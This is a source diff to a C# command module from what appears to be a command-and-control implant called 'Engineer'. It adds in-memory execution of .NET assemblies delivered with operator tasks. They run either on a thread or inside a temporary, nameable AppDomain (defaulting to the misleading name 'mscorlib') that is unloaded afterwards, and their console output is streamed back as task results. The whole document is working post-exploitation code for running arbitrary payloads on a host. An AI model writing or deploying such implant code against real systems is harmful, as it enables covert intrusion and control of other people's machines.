@@ -36,76 +36,157 @@ namespace Engineer.Commands
             assemblyArgument = assemblyArgument.TrimStart(' ');
             assemblyArgument = assemblyArgument.TrimStart('\"');
             assemblyArgument = assemblyArgument.TrimEnd('\"');
-
-
+            string appDomainName = null;
+            string execMethod = "";
+            bool execGiven = task.Arguments.TryGetValue("/execmethod", out execMethod);
+            if (execGiven)
+            {
+              bool appNameGiven =  task.Arguments.TryGetValue("/appdomain", out string appname);
+                if (appNameGiven)
+                {
+                    appDomainName = appname;
+                }
+                else
+                {
+                    appDomainName = "mscorlib";
+                }
+            }
+            else
+            {
+                appDomainName = "mscorlib";
+            }
+            string output = "";
 
             //set the console out and error to try and capture output from thread execution
-            var stdOut = Console.Out;
-            var stdErr = Console.Error;
-            var ms = new MemoryStream();
-
-
-            // use Console.SetOut() to redirect the output to a string
-            StreamWriter writer = new StreamWriter(ms) { AutoFlush = true };
-
-            //get the current Processes Console and set the SetOut and SetError to the stream writer
-            Console.SetOut(writer);
-            Console.SetError(writer);
+            var currentout = Console.Out;
+            var currenterror = Console.Error;
             try
             {
-
                 // debase64 encode assembly string into a byte array
                 byte[] assemblyBytes = task.File;
 
-                //make a new thread to run the assembly in and as it gets output from the assembly it will be written to the stream writer
-                Thread thread = new Thread(() =>
-                {
-                    //will block so needs its own thread
-                    Assembly assembly = Assembly.Load(assemblyBytes);
-                    assembly.EntryPoint.Invoke(null, new[] { $"{assemblyArgument}".Split() });
-                });
 
-                //start the thread 
-                thread.Start();
-                string output = "";
-                //while the thread is running call Tasking.FillTaskResults to update the task results
-                while (thread.IsAlive)
+                if (execMethod != null && execMethod.Equals("UnloadDomain",StringComparison.CurrentCultureIgnoreCase))
                 {
-                    //Console.WriteLine("thread is alive");
-                    //Console.WriteLine("filling task results");
-                    output = Encoding.UTF8.GetString(ms.ToArray());
-                    if (output.Length > 0)
+                    var appDomainSetup = new AppDomainSetup
                     {
-                        //clear the memory stream
-                        ms.Clear();
-                        Tasking.FillTaskResults(output, task, EngTaskStatus.Running, TaskResponseType.String);
-                        output = "";
-                    }
-                    if (task.cancelToken.IsCancellationRequested)
-                    {
-                        Tasking.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled, TaskResponseType.String);
-                        thread.Abort();
-                        break;
-                    }
-                    Thread.Sleep(10);
+                        ApplicationBase = AppDomain.CurrentDomain.BaseDirectory
+                    };
+                    output += $"[+] creating app domain {appDomainName}\n"; 
+                    var domain = AppDomain.CreateDomain(appDomainName, null, appDomainSetup);
+                    var executor = (AssemblyExecutor)domain.CreateInstanceAndUnwrap(Assembly.GetExecutingAssembly().FullName, typeof(AssemblyExecutor).FullName);
+                    output += executor.Execute(assemblyBytes, assemblyArgument.Split(), task, appDomainName);
+                    output += "\n[*] trying to unload appdomain";
+                    AppDomain.Unload(domain);
+                    output += "\n[+] app domain unloaded";
                 }
-                //finish reading and set status to complete 
-                output = Encoding.UTF8.GetString(ms.ToArray());
-                ms.Clear();
-                Tasking.FillTaskResults(output, task, EngTaskStatus.Complete, TaskResponseType.String);
+                else 
+                {
+                    using var ms = new MemoryStream();
+                    using var sw = new StreamWriter(ms)
+                    {
+                        AutoFlush = true
+                    };
 
+                    Console.SetOut(sw);
+                    Console.SetError(sw);
+                    //make a new thread to run the assembly in and as it gets output from the assembly it will be written to the stream writer
+                    Thread thread = new Thread(() =>
+                    {
+                        //will block so needs its own thread
+                        Assembly assembly = Assembly.Load(assemblyBytes);
+                        assembly.EntryPoint.Invoke(null, new[] { $"{assemblyArgument}".Split() });
+                    });
+
+                    //start the thread 
+                    thread.Start();
+                    //while the thread is running call Tasking.FillTaskResults to update the task results
+                    while (thread.IsAlive)
+                    {
+                        output = Encoding.UTF8.GetString(ms.ToArray());
+                        if (output.Length > 0)
+                        {
+                            ms.Clear();
+                            Tasking.FillTaskResults(output, task, EngTaskStatus.Running, TaskResponseType.String);
+                            output = ""; 
+                        }
+                        if (task.cancelToken.IsCancellationRequested)
+                        {
+                            Tasking.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled, TaskResponseType.String);
+                            thread.Abort();
+                            break;
+                        }
+                        Thread.Sleep(10);
+                    }
+                    //finish reading and set status to complete 
+                    output = Encoding.UTF8.GetString(ms.ToArray());
+                    ms.Clear();
+
+                }
+                Console.SetOut(currentout);
+                Console.SetError(currenterror);
+                Tasking.FillTaskResults(output, task, EngTaskStatus.Complete, TaskResponseType.String);
             }
             catch (Exception e)
             {
-                Tasking.FillTaskResults("error: " + e.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
+                //Console.WriteLine(e.Message);
+                //Console.WriteLine(e.StackTrace);
+                Console.SetOut(currentout);
+                Console.SetError(currenterror);
+                Tasking.FillTaskResults($"{output} \n error: " + e.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
             }
-            finally
+        }
+    }
+
+    internal class AssemblyExecutor : MarshalByRefObject
+    {
+        public string Execute(byte[] asm, string[] arguments,EngineerTask task,string appdomainName)
+        {
+
+
+            using var ms = new MemoryStream();
+            using var sw = new StreamWriter(ms)
             {
-                //reset the console out and error
-                Console.SetOut(stdOut);
-                Console.SetError(stdErr);
+                AutoFlush = true
+            };
+
+            Console.SetOut(sw);
+            Console.SetError(sw);
+
+            Thread thread = new Thread(() =>
+            {
+                //will block so needs its own thread
+                Assembly assembly = Assembly.Load(asm);
+                assembly.EntryPoint.Invoke(null, new[] { arguments });
+            });
+
+            //start the thread 
+            thread.Start();
+            string output = "";
+            //while the thread is running call Tasking.FillTaskResults to update the task results
+            while (thread.IsAlive)
+            {
+                Console.Out.Flush();
+                Console.Error.Flush();
+                output = Encoding.UTF8.GetString(ms.ToArray());
+                if (output.Length > 0)
+                {
+                    Tasking.FillTaskResults(output, task, EngTaskStatus.Running, TaskResponseType.String);
+                    output = "";
+                }
+                if (task.cancelToken.IsCancellationRequested)
+                {
+                    Tasking.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled, TaskResponseType.String);
+                    thread.Abort();
+                    break;
+                }
+                Thread.Sleep(10);
             }
-            return;
+            //finish reading and set status to complete
+            Console.Out.Flush();
+            Console.Error.Flush();
+            output = Encoding.UTF8.GetString(ms.ToArray());
+            return output;
         }
     }
 }
